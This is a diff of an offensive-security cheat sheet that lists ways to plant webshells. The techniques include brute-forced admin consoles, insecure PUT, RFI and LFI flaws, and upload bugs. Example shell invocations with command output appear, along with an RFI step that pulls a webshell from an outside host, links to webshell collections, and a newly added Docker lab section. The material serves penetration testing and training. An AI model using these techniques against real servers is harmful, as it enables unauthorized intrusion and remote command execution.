@@ -1,26 +1,35 @@
 # Webshell upload techniques
 
-#### Classic Webshell upload techniques
+### INDEX
 ```
-Technique 1. Webshell upload using a PHPMyAdmin Web console
-Technique 2. Webshell upload using an Apache Tomcat manager Web console
-Technique 3. Webshell upload using a JBoss administration JMX console
-Technique 4. Webshell upload using a WebLogic administration console
-Technique 5. Webshell upload using a CMS Website admin console (e.g., WordPress)
-Technique 6. Webshell upload by exploiting an insecure (writable) file share (FTP/CIFS/SAMBA/NFS) of a Web server (i.e., C:\inetpub\wwwroot\ or /var/www/)
-Technique 7. Webshell upload by abusing the insecure HTTP PUT method
-Technique 8. Webshell upload by exploiting a vulnerable file upload function
-Technique 9. Webshell upload by exploiting a remote file include (RFI) vulnerability
-Technique 10. Webshell upload by exploiting a local file include (LFI) vulnerability
-Technique 11. Webshell upload by exploiting a SQL injection (SQLi) vulnerability
-Technique 12. Webshell upload by exploiting a remote OS command execution vulnerability
-Technique 13. Webshell upload by exploiting a remote code execution (RCE) vulnerability (e.g. insecure deserialization, )
-Technique 14. Webshell upload by exploiting an insecure CKEditor (WYSIWYG HTML Editor with Collaborative Rich Text Editing)
-Technique 15. Webshell upload using a Lotus Domino admin console
-Technique 16. Webshell upload using a Jenkins admin console
-Technique 17. ...
+I. Classic Webshell upload techniques
+
+   ➤ Technique 1. Webshell upload using a PHPMyAdmin Web console
+   ➤ Technique 2. Webshell upload using an Apache Tomcat manager Web console
+   ➤ Technique 3. Webshell upload using a JBoss administration JMX console
+   ➤ Technique 4. Webshell upload using a WebLogic administration console
+   ➤ Technique 5. Webshell upload using a CMS Website admin console (e.g., WordPress)
+   ➤ Technique 6. Webshell upload by exploiting an insecure (writable) file share (FTP/CIFS/SAMBA/NFS) of a Web server (i.e., C:\inetpub\wwwroot\ or /var/www/)
+   ➤ Technique 7. Webshell upload by abusing the insecure HTTP PUT method
+   ➤ Technique 8. Webshell upload by exploiting a vulnerable file upload function
+   ➤ Technique 9. Webshell upload by exploiting a remote file include (RFI) vulnerability
+   ➤ Technique 10. Webshell upload by exploiting a local file include (LFI) vulnerability
+   ➤ Technique 11. Webshell upload by exploiting a SQL injection (SQLi) vulnerability
+   ➤ Technique 12. Webshell upload by exploiting a remote OS command execution vulnerability
+   ➤ Technique 13. Webshell upload by exploiting a remote code execution (RCE) vulnerability (e.g. insecure deserialization, )
+   ➤ Technique 14. Webshell upload by exploiting an insecure CKEditor (WYSIWYG HTML Editor with Collaborative Rich Text Editing)
+   ➤ Technique 15. Webshell upload using a Lotus Domino admin console
+   ➤ Technique 16. Webshell upload using a Jenkins admin console
+   ➤ Technique 17. ...
+
+II. List of common paths for the DocumentRoot directory (Web root folder)
+
+III. Usefull Github links for Webshells
+
+IV. Quickly set up a test environment using Docker
 ```
-##### Technique 1 - PHPMyAdmin Web console
+### I. Classic Webshell upload techniques
+#### Technique 1 - PHPMyAdmin Web console
 ```
 ➤ Step 1. Log into the PHPMyAdmin Web console by exploiting the presence of default or easy guessable credentials,
 	   anonymous access or by performing a brute-force or dictionnary password attack using Burp proxy
@@ -45,7 +54,7 @@ Technique 17. ...
            - http://x.x.x.x/<website-name>/Webshell.php?cmd=whoami
 ```
 
-##### Technique 2 - Apache Tomcat Manager Web console
+#### Technique 2 - Apache Tomcat Manager Web console
 ```
 ➤ Step 1. Log into the Tomcat manager Web console by exploiting the presence of default or easy guessable credentials,
 	   anonymous access or by performing a brute-force or dictionnary password attack using Burp proxy or Metasploit (use auxiliary/scanner/http/tomcat_mgr_login)
@@ -104,7 +113,7 @@ Technique 17. ...
 ```
 
 
-##### Technique 3 - JBoss Administration JMX console
+#### Technique 3 - JBoss Administration JMX console
 ```
 Example 1
 ---------
@@ -165,7 +174,7 @@ Example 2
 Other manual Webshell upload technique: https://securitysynapse.blogspot.com/2013/08/manually-exploiting-jboss-jmx-console.html
 ```
 
-##### Technique 4 - Weblogic Administration console
+#### Technique 4 - Weblogic Administration console
 ```
 ➤ Step 1. Log into the Weblogic admin console by exploiting the presence of default or easy guessable credentials,
 	   anonymous access or by performing a brute-force or dictionnary password attack using Burp proxy 
@@ -197,7 +206,7 @@ Other manual Webshell upload technique: https://securitysynapse.blogspot.com/201
            - Example: http://target_IP/<path>/webshell.jsp?cmd=whoami
 ```
 
-##### Technique 5 - Webshell upload by abusing a CMS Website admin console protected by a weak administrator password
+#### Technique 5 - Webshell upload by abusing a CMS Website admin console protected by a weak administrator password
 ##### <i>If you have admin privileges over a CMS such as WordPress, Kentico, DotNetNuke, Drupal, Joomla [...] then you can upload a webshell and execute OS commands.</i>
 ``` 
 Example 1 - WorPress
@@ -234,7 +243,7 @@ Example 2 - Kentico
 ➤ Step 3. upload a '.aspx' or '.asp' webshell using the CMS native upoad file function
 ``` 
 
-##### Technique 6 - Webshell upload by exploiting an insecure (writable) file share (CIFS) of a Windows IIS Web server (i.e., C:\inetpub\wwwroot\)
+#### Technique 6 - Webshell upload by exploiting an insecure (writable) file share (CIFS) of a Windows IIS Web server (i.e., C:\inetpub\wwwroot\)
 
 ```
 Example
@@ -248,7 +257,7 @@ Example
            - "http://x.x.x.x/application-name/Webshell.aspx" 
 ```
 
-##### Technique 7 - Webshell upload by abusing the insecure HTTP PUT method (WebDAV)
+#### Technique 7 - Webshell upload by abusing the insecure HTTP PUT method (WebDAV)
 ```
 ➤ Step 1. Find an insecure Web server which accepts PUT HTTP method
 	   - Examples with CURL
@@ -335,7 +344,7 @@ Example
              <SNIP>
 ```
 
-##### Technique 8 - Webshell upload by exploiting a vulnerable file upload function
+#### Technique 8 - Webshell upload by exploiting a vulnerable file upload function
 ```
 Example
 ➤ Step 1. You found a vulnerable image file upload function "image_upload.php".
@@ -403,7 +412,7 @@ Example
              uid=48(apache) gid=48(apache) groups=48(apache)
 ```
 
-##### Technique 9 - Webshell upload by exploiting a RFI vulnerability
+#### Technique 9 - Webshell upload by exploiting a RFI vulnerability
 ```
 Example
 ➤ Step 1. Review the content (php settings) of the page "/phpinfo.php" (e.g., identified with dirbuster)
@@ -422,7 +431,7 @@ Example
 	   - http://x.x.x.x/application/fileviewer.php?p=http://x.x.x.x/webshell
 ```
 
-##### Technique 10 - Webshell upload by exploiting a LFI vulnerability
+#### Technique 10 - Webshell upload by exploiting a LFI vulnerability
 ```
 Example
 ➤ Step 1. You find a website during an internal penetration test that is vulnerable to a Local File Include vulnerability and you can read log files such as '/var/log/auth.log' and '/var/log/mail' thanks to the LFI flaw.
@@ -463,7 +472,7 @@ Example
 	       <SNIP>
 ```
 
-##### Other - List of common path for the DocumentRoot directory (Web root folder)
+### II. List of common paths for the DocumentRoot directory (Web root folder)
 ```
 ➤ XAMP (Windows) = "c:\XAMPP\htdocs"
 ➤ IIS (Windows) = "C:\inetpub\wwwroot"
@@ -475,7 +484,7 @@ Example
 ➤ NGINX (Linux) = '/data/www' or '/data/w3' or "/usr/local/nginx/html' (configuration files can be found in the directory: '/usr/local/nginx/conf' or /etc/nginx' or '/usr/local/etc/nginx')
 ```
 
-##### Usefull links for Webshells
+### III. Usefull Github links for Webshells
 ```
 ➤ ASPX Webshell - https://github.com/tennc/webshell/tree/master/aspx/asp.net-backdoors
 ➤ ASP Webshell  - https://github.com/tennc/webshell/tree/master/fuzzdb-webshell/asp
@@ -484,4 +493,27 @@ Example
 ➤ PHP Webshell  - https://github.com/WhiteWinterWolf/wwwolf-php-webshell
 ➤ PHP Webshell  - https://github.com/tennc/webshell/tree/master/fuzzdb-webshell/php
 ➤ Various Webshells - https://github.com/tennc/webshell
+```
+
+### IV. Quickly set up a test environment using Docker
+#### Docker can be used to quickly set up a testing environment (https://hub.docker.com/search?q=)
+```
+For examples:
+➤ docker pull tomcat
+➤ docker pull phpmyadmin
+➤ docker pull nginx
+➤ docker pull ismaleiva90/weblogic12
+➤ docker pull jboss/keycloak
+➤ docker pull wordpress
+➤ ..
+```
+#### Projects like 'Vulhub' can also be very useful (https://github.com/vulhub/vulhub) 
+```
+➤ Jboss Web server - https://github.com/vulhub/vulhub/tree/master/jboss
+➤ Tomcat Web server - https://github.com/vulhub/vulhub/tree/master/tomcat
+➤ Weblogic Web server - https://github.com/vulhub/vulhub/tree/master/weblogic
+➤ Nginx Web server - https://github.com/vulhub/vulhub/tree/master/nginx
+➤ PhpMyAdmin portal - https://github.com/vulhub/vulhub/tree/master/phpmyadmin
+➤ Jenkins server - https://github.com/vulhub/vulhub/tree/master/jenkins
+➤ ...
 ```
